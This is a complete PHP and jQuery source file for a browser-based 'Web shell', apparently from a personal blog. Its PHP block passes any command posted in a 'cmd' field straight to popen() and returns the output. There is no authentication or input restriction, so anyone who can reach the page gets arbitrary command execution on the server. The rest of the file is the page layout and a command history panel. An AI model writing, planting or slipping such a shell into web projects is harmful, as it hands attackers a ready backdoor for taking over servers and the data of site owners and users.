<?php
	$str_http_path = $_SERVER["HTTP_HOST"] . substr(realpath(__FILE__), strlen($_SERVER["DOCUMENT_ROOT"]));

	function exec_shell($_cmd) {
		$fp = popen($_cmd, "r");

		$str_read_mesage = "";
		while( !feof($fp) ) {
			$buffer = fgets($fp, 4096);
			$str_read_mesage .= $buffer . "<br />";
		}
		pclose($fp);

		return $str_read_mesage;
	}

	if( isset($_POST["type"]) && $_POST["type"] == "exec" ) {
		$cmd = $_POST["cmd"];

		echo exec_shell($cmd);
		exit ;
	}
?>

<!DOCTYPE html>
<html>
	<head>
		<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
		<meta http-equiv="cache-control" content="no-cache" />
		<meta http-equiv="expires" content="0" />
		<meta http-equiv="pragma" content="no-cache" />

		<meta name="author"   content="https://muabow.tistory.com" />
		<meta name="keywords" content="https://muabow.tistory.com" />

		<title>Web shell</title>

		<script src="http://code.jquery.com/jquery.min.js"></script>
		<script type="text/javascript">
			class Handle {
				constructor() {
					this.path = "http://<?php echo $str_http_path; ?>";
				}

				makeArgs(_key, _value) {
					var args = "&" + _key + "=" + _value;

					return args;
				}

				postArgs(_target, _args) {
					var result;

					$.ajax({
						type	: "POST",
						url		: _target,
						data	: _args,
						async	: false,
						success	: function(data) {
							if( data != null ) {
								result = data;
							}
						}
					});

					return result;
				}

				exec(_cmd) {
					var submitArgs = "";
					submitArgs += this.makeArgs("type",   "exec");
					submitArgs += this.makeArgs("cmd",    _cmd);

					return this.postArgs(this.path, submitArgs);
				}
			}

			$(document).ready(function() {
				var handler = new Handle();
				var index = 1;

				$("#shell-input_exec").keyup(function(e) {
					if (e.keyCode == 13) $("#shell-input-button").trigger("click");
					return;
				});

				$("#shell-input-button").click(function() {
					var rc = handler.exec($("#shell-input_exec").val());

					$("#shell-body-frame").html(rc);
					$("#shell-body-top").html("[" + $("#shell-input_exec").val() + "]");
					$("#shell-history-frame").prepend("<div>" + index + "&nbsp;&nbsp;" + $("#shell-input_exec").val() + "</div>");
					$("#shell-input_exec").val("");

					index++;
					return ;
				});
			});
		</script>

		<style>
			.div_page_title_name {
				padding-top				: 10px;
				padding-bottom			: 10px;
				font-weight				: bolder;
				font-size				: 18px;
			}

			.div_form_body {
				margin-top				: 5px;
				margin-right			: 10px;
				border					: 1px solid #C0C0C0;
				height					: 350px;
			}
			
			.div_form_body_top {
				overflow-x 				: hidden;
				overflow-y 				: auto;
				height 					: 24px;
				border 					: 1px solid #7c7c7c;
				margin 					: 2px 2px 2px 2px;
				font-size				: 14px;
				padding-left			: 10px;
				display 				: flex;
				align-items				: center;
			}

			.div_form_body_frame {
				overflow-x 				: hidden;
				overflow-y 				: auto;
				height 					: 316px;
				border 					: 1px solid #7c7c7c;
				margin 					: 2px 2px 2px 2px;
				font-size				: 14px;
				padding-left			: 10px;
			}

			.div_form_input {
				display 				: flex;
				margin-top				: 5px;
				margin-right			: 10px;
				border					: 1px solid #C0C0C0;
				height					: 20px;
				padding 				: 5px;
			}
			
			.div_form_input_text {
				flex 					: 1 1 0;
			}

			.div_form_history {
				margin-top				: 5px;
				margin-right			: 10px;
				border					: 1px solid #C0C0C0;
				height					: 100px;
			}

			.div_form_history_frame {
				overflow-x 				: hidden;
				overflow-y 				: auto;
				height					: 94px;
				border 					: 1px solid #7c7c7c;
				margin 					: 2px 2px 2px 2px;
				font-size				: 14px;
				padding-left			: 10px;
			}

			.div_button {
				background-color 		: #e7e7e7;
				border 					: 1px solid #7c7c7c;
				color 					: black;
				text-align 				: center;
				text-decoration 		: none;
				display 				: inline-block;
				cursor 					: pointer;
				font-size 				: 12px;
				width 					: 100px;
				border-radius			: 2px;
				transition-duration		: 0.4s;
				height					: 18px; 
				line-height				: 18px; 
				margin-left				: 10px; 
				-webkit-transition-duration: 0.4s; /* Safari */
			}

			.div_button:hover {
				background-color 		: #7f7f7f;
				color 					: white;
			}


		</style>
	</head>

	<body>
		<div class="div_page_title_name"> Web shell </div>
		<hr />

		<div class="div_form_body">
			<div class="div_form_body_top"   id="shell-body-top"></div>
			<div class="div_form_body_frame" id="shell-body-frame"></div>
		</div>

		<div class="div_form_input">
			<input type="text" class="div_form_input_text" id="shell-input_exec" />
			<div class="div_button" id="shell-input-button"> Enter </div>
		</div>

		<br />
		
		<b>History</b>
		<div calss="div_form_history">
			<div class="div_form_history_frame" id="shell-history-frame"></div>
		</div>
	</body>
</html>